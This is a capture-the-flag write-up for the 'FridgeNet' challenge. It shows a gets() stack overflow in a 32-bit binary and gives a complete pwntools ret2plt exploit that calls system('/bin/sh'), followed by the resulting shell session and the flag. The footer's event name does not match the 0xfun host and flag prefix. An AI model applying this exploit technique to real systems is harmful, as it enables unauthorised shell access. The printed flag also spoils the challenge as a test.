# FridgeNet - PWN Challenge Writeup

## Challenge Description

**Name:** FridgeNet
**Category:** PWN / Binary Exploitation
**Difficulty:** Easy
**Service:** nc chall.0xfun.org 63809

**Story:**
> We've experienced a data breach! Our forensics team detected unusual network activity originating from our new smart refrigerator. It turns out there's an old debugging service still running on it. Now it's your job to figure out how the attackers gained access to the fridge!

## Reconnaissance

### Service Analysis

When connecting to the service we see a FridgeNet v0.3.7 menu:

```
---------FridgeNet---------
FridgeNet v0.3.7

Changelog:
- Fixed typo in welcome message
- Fixed issue that allowed bad actors to get /bin/sh

Type:
    1   Display fridge contents
    2   Set fridge welcome message
    3   Exit
```

Interesting: the changelog mentions they "fixed" an issue with `/bin/sh`. This is a hint.

### Binary Analysis

```bash
file vuln
# vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked

checksec vuln
# Arch:       i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found      <- VULNERABLE
# NX:         NX enabled
# PIE:        No PIE (0x8048000)  <- Fixed addresses
# Stripped:   No
```

**Protections:**
- No Stack Canary
- No PIE (fixed addresses)
- NX enabled (non-executable stack)
- Not stripped (symbols present)

## Static Analysis

### Important Functions

```bash
r2 -A vuln
afl | grep -E "main|welcome|food"
```

Functions found:
- `main` (0x080492c0)
- `set_welcome_message` (0x08049222)
- `print_food` (0x080491e6)

### Vulnerability in set_welcome_message

Decompiling the `set_welcome_message` function:

```c
void set_welcome_message() {
    char buffer[44];  // Buffer at [ebp-0x2c]
    FILE *fp;

    puts("New welcome message (up to 32 chars):");
    gets(buffer);  // <- VULNERABILITY: gets() with no limit!

    fp = fopen("config.txt", "w");
    if (fp == NULL) {
        puts("Error opening file!");
        exit(1);
    }

    fprintf(fp, "welcome_msg: %s", buffer);
    fclose(fp);
}
```

**Identified vulnerability:** Classic buffer overflow using `gets()` which does not check bounds.

- Local buffer: 44 bytes
- `gets()` reads unlimited input
- No stack canary -> directly exploitable
- No PIE -> fixed addresses

## Exploitation Strategy

### Searching for Useful Gadgets

```python
from pwn import *
elf = ELF('vuln')

# Functions available in PLT
print(hex(elf.plt['system']))  # 0x80490a0
print(hex(elf.plt['gets']))    # 0x8049060

# Search for "/bin/sh" string
binsh = next(elf.search(b'/bin/sh\x00'))
print(hex(binsh))  # 0x804a09a <- Found!
```

**Key discovery:** The binary contains the string `/bin/sh` at `0x804a09a`

### Technique: ret2plt

Attack plan:
1. Overflow the buffer to overwrite EIP
2. Redirect to `system@plt`
3. Pass `/bin/sh` as argument
4. Get shell

### Offset Calculation

```
Buffer:    44 bytes  [ebp-0x2c]
Saved EBP:  4 bytes
Saved EIP:  4 bytes (<- overwrite here)
---
Total offset: 48 bytes
```

### Payload Construction

For x86 (32-bit) architecture, the calling convention is:

```
[padding] [system_addr] [ret_addr] [arg1]
   48         4             4         4
```

```python
payload = flat(
    b'A' * 48,           # Padding to EIP
    system_plt,          # Overwrite EIP -> system()
    0xdeadbeef,          # Return address (doesn't matter)
    binsh                # First argument: "/bin/sh"
)
```

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

HOST = 'chall.0xfun.org'
PORT = 63809

elf = ELF('./vuln')

# Addresses
system_plt = elf.plt['system']  # 0x80490a0
binsh = next(elf.search(b'/bin/sh\x00'))  # 0x804a09a

# Payload: 48 bytes padding + system + fake_ret + arg
payload = flat(
    b'A' * 48,
    system_plt,
    0xdeadbeef,
    binsh
)

# Connect and exploit
p = remote(HOST, PORT)
p.recvuntil(b'>')
p.sendline(b'2')  # Option: Set welcome message
p.recvuntil(b':')
p.sendline(payload)

# Shell obtained
p.interactive()
```

## Obtaining the Flag

```bash
$ python3 exploit.py
[+] Opening connection to chall.0xfun.org on port 63809: Done
[*] Switching to interactive mode
$ ls -la
-rw-r--r-- 1 root root    83 Oct 23 15:20 flag.txt
$ cat flag.txt
0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}
```

## FLAG

```
0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}
```

## Technical Summary

**Vulnerability:** Buffer overflow in `set_welcome_message()` function using `gets()`

**Attack vector:** Stack-based buffer overflow -> ret2plt

**Technique used:**
- EIP overwrite with `system@plt` address
- Passing `/bin/sh` as argument (already present in the binary)
- Full control of execution flow

**Bypassed protections:**
- No stack canary -> direct overflow
- No PIE -> hardcoded addresses

**Lesson:** Never use `gets()` in production code. Use `fgets()` with a size limit.

## Tools Used

- `checksec` - Protection verification
- `radare2` - Static analysis
- `pwntools` - Exploitation framework
- `strings` - Useful string search

---

**Author:** Claude
**Date:** 2026-02-13
**CTF:** Pragyan CTF 2026
